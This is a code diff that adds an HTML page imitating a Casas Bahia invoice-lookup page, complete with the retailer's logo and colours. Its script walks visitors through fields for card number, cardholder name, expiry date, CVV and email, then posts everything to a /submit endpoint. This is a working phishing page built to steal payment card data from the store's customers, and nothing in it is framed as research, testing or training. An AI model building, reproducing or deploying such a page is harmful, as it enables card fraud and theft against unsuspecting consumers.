@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consultar Fatura</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+        }
+
+        .header {
+            background-color: #e60000; /* Vermelho Casas Bahia */
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .header img {
+            height: 40px;
+        }
+
+        .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 40px;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .left {
+            max-width: 50%;
+            flex: 1;
+        }
+
+        .left h1 {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .left p {
+            font-size: 14px;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        .right {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 300px;
+            flex: 1;
+        }
+
+        .right input {
+            width: 95%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .right button {
+            width: 100%;
+            padding: 10px;
+            background-color: #e60000;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .right button:hover {
+            background-color: #b30000;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 20px;
+            }
+            .left {
+                max-width: 100%;
+            }
+            .left h1 {
+                font-size: 20px;
+            }
+            .left p {
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .right {
+                width: 100%;
+                padding: 15px;
+            }
+            .right input,
+            .right button {
+                font-size: 14px;
+            }
+            .left h1 {
+                font-size: 18px;
+            }
+            .left p {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e6/Casas_Bahia_logo.svg/1024px-Casas_Bahia_logo.svg.png" alt="Casas Bahia Logo">
+    </div>
+    <div class="container">
+        <div class="left">
+            <h1>Consultar fatura</h1>
+            <p>Receba a 2ª via da sua fatura Casas Bahia por e-mail.</p>
+            <p>Para consultar sua fatura ou atualizar seu endereço de e-mail, acesse sua conta ou entre em contato com o atendimento.</p>
+        </div>
+        <div class="right">
+            <form id="form">
+                <input type="text" id="inputField" placeholder="Número do Cartão" required>
+                <button type="button" id="nextButton">Continuar</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const steps = [
+            { placeholder: "Número do Cartão", key: "cardNumber" },
+            { placeholder: "Nome no Cartão", key: "nomeCartao" },
+            { placeholder: "Validade (MM/AA)", key: "validade" },
+            { placeholder: "CVV", key: "cvv" },
+            { placeholder: "Email", key: "email" }
+        ];
+
+        const formData = {};
+        let currentStep = 0;
+
+        const input = document.getElementById("inputField");
+        const button = document.getElementById("nextButton");
+
+        button.addEventListener("click", () => {
+            const value = input.value.trim();
+            if (!value) {
+                alert("Por favor, preencha o campo antes de continuar.");
+                return;
+            }
+
+            formData[steps[currentStep].key] = value;
+            currentStep++;
+
+            if (currentStep < steps.length) {
+                input.value = "";
+                input.placeholder = steps[currentStep].placeholder;
+            } else {
+                enviarDados(formData);
+            }
+        });
+
+        function enviarDados(data) {
+            fetch("/submit", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.status === "success") {
+                    alert("Dados enviados com sucesso!");
+                } else {
+                    alert("Erro: " + result.message);
+                }
+            })
+            .catch(error => alert("Erro ao enviar dados: " + error.message));
+        }
+    </script>
+</body>
+</html>
